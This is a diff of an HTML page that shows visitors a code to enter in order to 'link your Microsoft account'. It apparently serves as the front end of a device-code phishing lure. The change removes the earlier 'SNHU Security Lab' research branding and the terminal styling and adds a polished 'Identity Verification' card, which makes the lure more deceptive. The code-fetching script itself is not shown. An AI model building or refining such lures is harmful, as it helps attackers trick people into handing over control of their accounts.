@@ -1,24 +1,137 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>SNHU Security Lab: Device Code Research</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Protocol Research Lab | Device Auth</title>
     <style>
-        body { background: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
-        #terminal { border: 1px solid #333; padding: 20px; background: #000; }
-        .big-code { font-size: 48px; letter-spacing: 10px; margin: 20px 0; color: #fff; }
-        #status { color: #888; }
+        :root {
+            --bg: #0a0a0a;
+            --card-bg: rgba(255, 255, 255, 0.03);
+            --accent: #3b82f6;
+            --text-main: #ededed;
+            --text-dim: #a1a1a1;
+            --glow: 0 0 20px rgba(59, 130, 246, 0.3);
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text-main);
+            font-family: 'Inter', -apple-system, system-ui, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 2rem;
+            text-align: center;
+        }
+
+        .header {
+            margin-bottom: 3rem;
+        }
+
+        .header h1 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+            margin-bottom: 0.5rem;
+        }
+
+        .header p {
+            color: var(--text-dim);
+            font-size: 0.9rem;
+        }
+
+        /* Glassmorphism Code Card */
+        .code-card {
+            background: var(--card-bg);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 2.5rem 1rem;
+            backdrop-filter: blur(10px);
+            position: relative;
+            box-shadow: var(--glow);
+            transition: transform 0.3s ease;
+        }
+
+        .code-card:hover {
+            transform: translateY(-5px);
+        }
+
+        #code-display {
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            font-size: 2.5rem;
+            font-weight: 700;
+            letter-spacing: 0.15em;
+            color: #fff;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+            margin: 0;
+        }
+
+        .status-badge {
+            display: inline-block;
+            margin-top: 1.5rem;
+            padding: 0.4rem 1rem;
+            border-radius: 100px;
+            font-size: 0.75rem;
+            font-weight: 500;
+            background: rgba(59, 130, 246, 0.1);
+            color: var(--accent);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+        }
+
+        .footer {
+            margin-top: 3rem;
+            font-size: 0.8rem;
+            color: var(--text-dim);
+        }
+
+        .loader {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            border: 2px solid rgba(255,255,255,0.1);
+            border-radius: 50%;
+            border-top-color: var(--accent);
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Mobile Adjustments */
+        @media (max-width: 480px) {
+            #code-display { font-size: 2rem; }
+        }
     </style>
 </head>
 <body>
-    <div id="terminal">
-        <h2>[ SYSTEM READY ]</h2>
-        <p>1. Go to: <strong>microsoft.com/devicelogin</strong></p>
-        <p>2. Enter this access code:</p>
-        <div id="user-code" class="big-code">LOADING...</div>
-        <p id="status">Connecting to Cloudflare Bridge...</p>
-        <hr>
-        <pre id="terminal-output">// Waiting for handshake...</pre>
+
+    <div class="container">
+        <div class="header">
+            <h1>Identity Verification</h1>
+            <p>Enter this code on your device to link your Microsoft account for the research simulation.</p>
+        </div>
+
+        <div class="code-card">
+            <div id="loader-container">
+                <div class="loader"></div>
+            </div>
+            <p id="code-display" style="display: none;">--------</p>
+            <div class="status-badge" id="status">INITIALIZING ENGINE</div>
+        </div>
+
+        <div class="footer">
+            Protocol v3.4 | Simulation Lab Environment
+        </div>
     </div>
+
     <script src="index.js"></script>
 </body>
 </html>
